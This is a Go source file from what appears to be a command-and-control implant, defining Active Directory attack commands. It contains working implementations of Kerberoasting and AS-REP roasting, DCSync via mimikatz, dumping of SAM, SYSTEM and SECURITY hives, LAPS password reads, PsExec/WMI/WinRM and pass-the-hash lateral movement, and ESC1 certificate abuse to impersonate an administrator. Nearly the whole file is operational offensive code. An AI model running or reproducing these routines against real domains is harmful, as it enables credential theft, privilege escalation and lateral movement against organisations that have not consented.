package implant

import (
	"fmt"
	"os"
	"runtime"
	"strings"
)

// ADCommand represents an Active Directory attack/enumeration command.
type ADCommand struct {
	Name        string
	Description string
	Executor    func(args []string) ([]byte, error)
}

// GetADCommands returns all available AD pentest commands.
func GetADCommands() map[string]ADCommand {
	return map[string]ADCommand{
		// ── Enumeration ──
		"ad-enum-domain": {
			Name:        "ad-enum-domain",
			Description: "Enumerate domain information (domain name, DCs, forest)",
			Executor:    adEnumDomain,
		},
		"ad-enum-users": {
			Name:        "ad-enum-users",
			Description: "Enumerate domain users",
			Executor:    adEnumUsers,
		},
		"ad-enum-groups": {
			Name:        "ad-enum-groups",
			Description: "Enumerate domain groups and memberships",
			Executor:    adEnumGroups,
		},
		"ad-enum-computers": {
			Name:        "ad-enum-computers",
			Description: "Enumerate domain computers",
			Executor:    adEnumComputers,
		},
		"ad-enum-shares": {
			Name:        "ad-enum-shares",
			Description: "Enumerate accessible SMB shares",
			Executor:    adEnumShares,
		},
		"ad-enum-spns": {
			Name:        "ad-enum-spns",
			Description: "Enumerate Service Principal Names (Kerberoastable accounts)",
			Executor:    adEnumSPNs,
		},
		"ad-enum-gpo": {
			Name:        "ad-enum-gpo",
			Description: "Enumerate Group Policy Objects",
			Executor:    adEnumGPO,
		},
		"ad-enum-trusts": {
			Name:        "ad-enum-trusts",
			Description: "Enumerate domain trusts",
			Executor:    adEnumTrusts,
		},
		"ad-enum-admins": {
			Name:        "ad-enum-admins",
			Description: "Enumerate Domain Admins and Enterprise Admins",
			Executor:    adEnumAdmins,
		},
		"ad-enum-asrep": {
			Name:        "ad-enum-asrep",
			Description: "Find AS-REP roastable accounts (no preauth required)",
			Executor:    adEnumASREP,
		},
		"ad-enum-delegation": {
			Name:        "ad-enum-delegation",
			Description: "Find accounts with unconstrained/constrained delegation",
			Executor:    adEnumDelegation,
		},
		"ad-enum-laps": {
			Name:        "ad-enum-laps",
			Description: "Enumerate LAPS passwords (if readable)",
			Executor:    adEnumLAPS,
		},

		// ── Attacks ──
		"ad-kerberoast": {
			Name:        "ad-kerberoast",
			Description: "Kerberoast: request TGS tickets for SPN accounts",
			Executor:    adKerberoast,
		},
		"ad-asreproast": {
			Name:        "ad-asreproast",
			Description: "AS-REP Roast: request AS-REP for accounts without preauth",
			Executor:    adASREPRoast,
		},
		"ad-dcsync": {
			Name:        "ad-dcsync",
			Description: "DCSync: replicate password hashes via DRS (requires DA)",
			Executor:    adDCSync,
		},

		// ── Credential Access ──
		"ad-dump-sam": {
			Name:        "ad-dump-sam",
			Description: "Dump SAM database (local admin required)",
			Executor:    adDumpSAM,
		},
		"ad-dump-lsa": {
			Name:        "ad-dump-lsa",
			Description: "Dump LSA secrets",
			Executor:    adDumpLSA,
		},
		"ad-dump-tickets": {
			Name:        "ad-dump-tickets",
			Description: "Dump Kerberos tickets from memory",
			Executor:    adDumpTickets,
		},

		// ── Lateral Movement ──
		"ad-psexec": {
			Name:        "ad-psexec",
			Description: "PsExec-style remote execution via SMB",
			Executor:    adPsExec,
		},
		"ad-wmi": {
			Name:        "ad-wmi",
			Description: "Remote execution via WMI",
			Executor:    adWMI,
		},
		"ad-winrm": {
			Name:        "ad-winrm",
			Description: "Remote execution via WinRM",
			Executor:    adWinRM,
		},
		"ad-pass-the-hash": {
			Name:        "ad-pass-the-hash",
			Description: "Pass-the-Hash authentication",
			Executor:    adPassTheHash,
		},

		// ── ADCS ──
		"ad-adcs-enum": {
			Name:        "ad-adcs-enum",
			Description: "Enumerate ADCS certificate templates for ESC1-ESC8 misconfigurations",
			Executor:    adADCSEnum,
		},
		"ad-adcs-request": {
			Name:        "ad-adcs-request",
			Description: "Request a certificate with alternate SAN (ESC1 exploitation). Args: template-name target-upn",
			Executor:    adADCSRequest,
		},
	}
}

// ── Enumeration Implementations ──

func adEnumDomain(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		cmds := []string{
			"echo === Domain Info === && nltest /dsgetdc: && echo.",
			"echo === Domain Controller === && nltest /dclist: && echo.",
			"echo === Forest Info === && nltest /domain_trusts /all_trusts && echo.",
			"echo === DNS Domain === && systeminfo | findstr /B /C:\"Domain\"",
		}
		return ExecuteShell([]string{strings.Join(cmds, " && ")})
	}
	return ExecuteShell([]string{"echo 'AD enumeration requires Windows domain context or LDAP tools'; cat /etc/resolv.conf 2>/dev/null"})
}

func adEnumUsers(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		if len(args) > 0 {
			return ExecuteShell([]string{fmt.Sprintf("net user %s /domain", args[0])})
		}
		return ExecuteShell([]string{"net user /domain"})
	}
	return linuxLDAPEnum("(&(objectCategory=person)(objectClass=user))", "sAMAccountName")
}

func adEnumGroups(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		if len(args) > 0 {
			return ExecuteShell([]string{fmt.Sprintf("net group \"%s\" /domain", args[0])})
		}
		return ExecuteShell([]string{"net group /domain"})
	}
	return linuxLDAPEnum("(objectCategory=group)", "cn")
}

func adEnumComputers(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{"net view /domain 2>nul & dsquery computer -limit 0"})
	}
	return linuxLDAPEnum("(objectCategory=computer)", "cn,operatingSystem")
}

func adEnumShares(args []string) ([]byte, error) {
	target := "127.0.0.1"
	if len(args) > 0 {
		target = args[0]
	}
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{fmt.Sprintf("net view \\\\%s", target)})
	}
	return ExecuteShell([]string{fmt.Sprintf("smbclient -L //%s -N 2>/dev/null", target)})
}

func adEnumSPNs(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		// PowerShell LDAP query for SPNs
		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(servicePrincipalName=*))';$search.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'));$results = $search.FindAll();foreach($r in $results){$name = $r.Properties['samaccountname'][0];$spns = $r.Properties['serviceprincipalname'];foreach($s in $spns){Write-Output "$name : $s"}}`
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return linuxLDAPEnum("(&(objectCategory=user)(servicePrincipalName=*))", "sAMAccountName,servicePrincipalName")
}

func adEnumGPO(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{"gpresult /r"})
	}
	return linuxLDAPEnum("(objectClass=groupPolicyContainer)", "displayName,gPCFileSysPath")
}

func adEnumTrusts(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{"nltest /domain_trusts /all_trusts"})
	}
	return ExecuteShell([]string{"echo 'Trust enumeration requires Windows context'"})
}

func adEnumAdmins(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{`net group "Domain Admins" /domain & echo. & net group "Enterprise Admins" /domain & echo. & net localgroup administrators`})
	}
	return linuxLDAPEnum("(&(objectCategory=group)(cn=Domain Admins))", "member")
}

func adEnumASREP(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';$search.PropertiesToLoad.Add('samaccountname');$results = $search.FindAll();foreach($r in $results){Write-Output $r.Properties['samaccountname'][0]}`
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return linuxLDAPEnum("(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))", "sAMAccountName")
}

func adEnumDelegation(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*)))';$search.PropertiesToLoad.AddRange(@('samaccountname','msDS-AllowedToDelegateTo','userAccountControl'));$results = $search.FindAll();foreach($r in $results){$name = $r.Properties['samaccountname'][0];$del = $r.Properties['msDS-AllowedToDelegateTo'];Write-Output "User: $name | Delegation: $del"}`
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return linuxLDAPEnum("(&(objectCategory=user)(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*)))", "sAMAccountName,msDS-AllowedToDelegateTo")
}

func adEnumLAPS(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))';$search.PropertiesToLoad.AddRange(@('cn','ms-MCS-AdmPwd','ms-MCS-AdmPwdExpirationTime'));$results = $search.FindAll();if($results.Count -eq 0){Write-Output 'No LAPS passwords readable with current privileges'}else{foreach($r in $results){$cn = $r.Properties['cn'][0];$pw = $r.Properties['ms-MCS-AdmPwd'][0];Write-Output "$cn : $pw"}}`
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return linuxLDAPEnum("(&(objectCategory=computer)(ms-MCS-AdmPwd=*))", "cn,ms-MCS-AdmPwd")
}

// ── Attack Implementations ──

func adKerberoast(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		// Request TGS tickets for all SPN accounts and output as hashcat format
		ps := `Add-Type -AssemblyName System.IdentityModel;$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';$search.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'));$results = $search.FindAll();foreach($r in $results){$user = $r.Properties['samaccountname'][0];$spn = $r.Properties['serviceprincipalname'][0];try{$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;$stream = $ticket.GetRequest();$hash = [System.BitConverter]::ToString($stream) -replace '-','';Write-Output "User: $user | SPN: $spn";Write-Output "Hash: $hash";Write-Output '---'}catch{Write-Output "Failed: $user ($spn)"}}`
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return ExecuteShell([]string{"echo 'Kerberoasting on Linux requires impacket: GetUserSPNs.py'"})
}

func adASREPRoast(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';$search.PropertiesToLoad.Add('samaccountname');$results = $search.FindAll();Write-Output "AS-REP Roastable Accounts:";Write-Output "─────────────────────────";foreach($r in $results){Write-Output $r.Properties['samaccountname'][0]};Write-Output "";Write-Output "Use impacket GetNPUsers.py or Rubeus to extract hashes"`
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return ExecuteShell([]string{"echo 'AS-REP Roasting on Linux requires impacket: GetNPUsers.py'"})
}

func adDCSync(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte("Usage: ad-dcsync <DOMAIN/user>\nExample: ad-dcsync CORP/krbtgt\nRequires Domain Admin or Replication rights"), nil
	}
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{fmt.Sprintf(`mimikatz.exe "lsadump::dcsync /user:%s" exit`, args[0])})
	}
	return []byte("DCSync on Linux requires impacket: secretsdump.py -just-dc-user " + args[0]), nil
}

// ── Credential Access ──

func adDumpSAM(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{`reg save HKLM\SAM sam.hiv /y & reg save HKLM\SYSTEM system.hiv /y & echo SAM and SYSTEM hives saved`})
	}
	return ExecuteShell([]string{"echo 'SAM dump requires Windows with local admin'"})
}

func adDumpLSA(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{`reg save HKLM\SECURITY security.hiv /y & echo SECURITY hive saved`})
	}
	return ExecuteShell([]string{"echo 'LSA dump requires Windows with local admin'"})
}

func adDumpTickets(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{"klist"})
	}
	return ExecuteShell([]string{"klist 2>/dev/null || echo 'No Kerberos tickets found'"})
}

// ── Lateral Movement ──

func adPsExec(args []string) ([]byte, error) {
	if len(args) < 2 {
		return []byte("Usage: ad-psexec <target> <command>\nExample: ad-psexec 10.0.0.5 whoami"), nil
	}
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{fmt.Sprintf(`psexec.exe \\%s -accepteula %s`, args[0], strings.Join(args[1:], " "))})
	}
	return []byte(fmt.Sprintf("PsExec on Linux: impacket-psexec 'user:pass@%s' '%s'", args[0], strings.Join(args[1:], " "))), nil
}

func adWMI(args []string) ([]byte, error) {
	if len(args) < 2 {
		return []byte("Usage: ad-wmi <target> <command>"), nil
	}
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{fmt.Sprintf(`wmic /node:"%s" process call create "%s"`, args[0], strings.Join(args[1:], " "))})
	}
	return []byte(fmt.Sprintf("WMI on Linux: impacket-wmiexec 'user:pass@%s' '%s'", args[0], strings.Join(args[1:], " "))), nil
}

func adWinRM(args []string) ([]byte, error) {
	if len(args) < 2 {
		return []byte("Usage: ad-winrm <target> <command>"), nil
	}
	if runtime.GOOS == "windows" {
		ps := fmt.Sprintf(`Invoke-Command -ComputerName %s -ScriptBlock { %s }`, args[0], strings.Join(args[1:], " "))
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return []byte(fmt.Sprintf("WinRM on Linux: evil-winrm -i %s -u user -p pass", args[0])), nil
}

func adPassTheHash(args []string) ([]byte, error) {
	if len(args) < 3 {
		return []byte("Usage: ad-pass-the-hash <target> <user> <ntlm_hash> [command]\nExample: ad-pass-the-hash 10.0.0.5 admin aad3b435b51404eeaad3b435b51404ee:hash whoami"), nil
	}
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{fmt.Sprintf(`sekurlsa::pth /user:%s /ntlm:%s /run:cmd.exe`, args[1], args[2])})
	}
	cmd := "whoami"
	if len(args) > 3 {
		cmd = strings.Join(args[3:], " ")
	}
	return []byte(fmt.Sprintf("PtH on Linux: impacket-psexec -hashes '%s' '%s@%s' '%s'", args[2], args[1], args[0], cmd)), nil
}

// ── ADCS Attacks ──

// adADCSEnum enumerates ADCS certificate templates looking for ESC misconfigurations.
func adADCSEnum(args []string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		// Query LDAP for certificate templates with dangerous flags.
		// msPKI-Certificate-Name-Flag bit 1 = ENROLLEE_SUPPLIES_SUBJECT (ESC1)
		// msPKI-Enrollment-Flag bit 1 = CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS (ESC2)
		cmds := []string{
			// List all CAs
			`certutil -config - -ping 2>&1 || certutil -CA 2>&1`,
			// Enumerate templates with PowerShell LDAP query
			`powershell -NoP -W Hidden -C "` +
				`$root = [ADSI]'LDAP://RootDSE';` +
				`$conf = $root.configurationNamingContext;` +
				`$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]\"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$conf\");` +
				`$searcher.Filter = '(objectClass=pKICertificateTemplate)';` +
				`$searcher.PropertiesToLoad.AddRange(@('cn','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','pKIExtendedKeyUsage','nTSecurityDescriptor'));` +
				`$templates = $searcher.FindAll();` +
				`foreach($t in $templates){` +
				`  $nameFlag = [int]$t.Properties['msPKI-Certificate-Name-Flag'][0];` +
				`  $enrollFlag = [int]$t.Properties['msPKI-Enrollment-Flag'][0];` +
				`  $esc1 = ($nameFlag -band 1) -ne 0;` +
				`  $eku = $t.Properties['pKIExtendedKeyUsage'];` +
				`  Write-Output \"Template: $($t.Properties['cn'][0])  NameFlag: $nameFlag  EnrollFlag: $enrollFlag  ESC1: $esc1  EKU: $eku\"` +
				`}"`,
		}
		var out []byte
		for _, cmd := range cmds {
			result, _ := ExecuteShell([]string{cmd})
			out = append(out, result...)
			out = append(out, '\n')
		}
		return out, nil
	}
	// Linux: use ldapsearch if available
	cmd := `ldapsearch -H ldap:// -x -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,$(ldapsearch -H ldap:// -x -s base namingContexts 2>/dev/null | grep configurationNamingContext | awk '{print $2}')" "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag 2>/dev/null || echo "ldapsearch not available or not domain-joined"`
	return ExecuteShell([]string{cmd})
}

// adADCSRequest requests a certificate with an alternate UPN (ESC1 exploitation).
// args[0]: certificate template name
// args[1]: target UPN (e.g., "administrator@domain.com")
func adADCSRequest(args []string) ([]byte, error) {
	if len(args) < 2 {
		return []byte("Usage: ad-adcs-request <template-name> <target-upn>\nExample: ad-adcs-request UserAuthentication administrator@domain.com"), nil
	}
	template := args[0]
	targetUPN := args[1]

	if runtime.GOOS == "windows" {
		// Use certreq to request cert with SAN override.
		// This requires the template to have CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1).
		infContent := fmt.Sprintf(`[NewRequest]
Subject = "CN=phantom"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = False
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = CMC
KeyUsage = 0xa0
[RequestAttributes]
CertificateTemplate = %s
SAN = "upn=%s"
`, template, targetUPN)

		tmpInf := os.TempDir() + `\phantom_cert.inf`
		tmpReq := os.TempDir() + `\phantom_cert.req`
		tmpCer := os.TempDir() + `\phantom_cert.cer`
		tmpPfx := os.TempDir() + `\phantom_cert.pfx`

		if err := os.WriteFile(tmpInf, []byte(infContent), 0600); err != nil {
			return nil, fmt.Errorf("write INF: %w", err)
		}

		cmds := []string{
			fmt.Sprintf(`certreq -new "%s" "%s"`, tmpInf, tmpReq),
			fmt.Sprintf(`certreq -submit -config - "%s" "%s"`, tmpReq, tmpCer),
			fmt.Sprintf(`certreq -accept "%s"`, tmpCer),
			fmt.Sprintf(`certutil -exportPFX -p phantom123 My phantom "%s"`, tmpPfx),
		}

		var out []byte
		for _, cmd := range cmds {
			result, _ := ExecuteShell([]string{cmd})
			out = append(out, result...)
			out = append(out, '\n')
			// If cert file exists, we succeeded
			if _, err := os.Stat(tmpPfx); err == nil {
				out = append(out, []byte(fmt.Sprintf("[+] Certificate exported to: %s (password: phantom123)\n[+] Use with Rubeus: Rubeus.exe asktgt /user:administrator /certificate:%s /password:phantom123\n", tmpPfx, tmpPfx))...)
				break
			}
		}
		// Cleanup temp files except PFX
		os.Remove(tmpInf)
		os.Remove(tmpReq)
		os.Remove(tmpCer)
		return out, nil
	}
	return []byte("ADCS certificate request requires Windows (certreq). On Linux, use Certipy: certipy req -u user@domain -p pass -ca CA-NAME -template " + template + " -upn " + targetUPN), nil
}

// ── Linux LDAP Helper ──

func linuxLDAPEnum(filter, attributes string) ([]byte, error) {
	// Try to auto-detect domain from resolv.conf
	cmd := fmt.Sprintf(`domain=$(grep -i "search\|domain" /etc/resolv.conf 2>/dev/null | head -1 | awk '{print $2}'); if [ -z "$domain" ]; then echo "Cannot detect domain"; exit 1; fi; dc=$(echo "$domain" | sed 's/\./,dc=/g' | sed 's/^/dc=/'); ldapsearch -x -H ldap://$domain -b "$dc" '%s' %s 2>/dev/null | head -100`, filter, attributes)
	return ExecuteShell([]string{cmd})
}
